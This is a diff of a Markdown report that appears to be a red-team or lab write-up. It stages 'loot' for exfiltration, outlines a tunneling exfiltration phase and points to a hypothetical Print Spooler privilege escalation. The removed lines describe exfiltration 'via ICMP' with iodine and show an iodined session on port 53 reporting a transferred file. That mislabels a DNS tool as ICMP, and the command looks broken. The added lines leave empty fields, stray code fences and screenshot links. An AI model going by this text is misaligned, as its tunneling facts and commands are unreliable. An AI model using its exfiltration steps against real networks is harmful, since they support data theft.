@@ -216,20 +216,25 @@ dir C:\temp\
 The `loot.zip` archive contains the custom script results staged at `C:\temp\loot.zip` and ready for exfiltration in Phase 3.
 
 ### Phase 3: Exfiltration
-**Method:** ICMP Tunneling via `iodine`
-**Justification:** ICMP traffic is often allowed for network diagnostics and is rarely logged in detail by perimeter firewalls, unlike HTTP/HTTPS.
+**Method:** 
+**Justification:** 
 
 **Detection Risk:**
-High volume of ICMP echo requests with large payloads may trigger IDS signatures for tunneling tools.
+
 
 **Verification on C2:**
-```bash
-$ iodined -f -n -P [password] 192.168.50.10:53 data.7z
-[+] Tunnel established
-[+] Transferred 45KB
-$ ls -l data.7z
--rw-r--r-- 1 user user 45000 Oct 12 14:22 data.7z
 ```
+
+```
+<img width="764" height="60" alt="image" src="https://github.com/user-attachments/assets/482d657a-03d5-4a37-be2a-7883bc558756" />
+
+<img width="946" height="413" alt="image" src="https://github.com/user-attachments/assets/9206199a-c13b-47e9-9a8f-1f8bdb16fcbb" />
+
+<img width="1064" height="408" alt="image" src="https://github.com/user-attachments/assets/cf08a3d5-3d67-4df1-9e50-84a66d71272f" />
+
+<img width="472" height="169" alt="image" src="https://github.com/user-attachments/assets/95c3706a-36cb-4c69-8fde-9ad6279e9d6b" />
+
+
 
 ### Phase 4: Privilege Escalation
 **Vulnerability:** CVE-2023-XXXXX (Hypothetical Print Spooler Flaw)
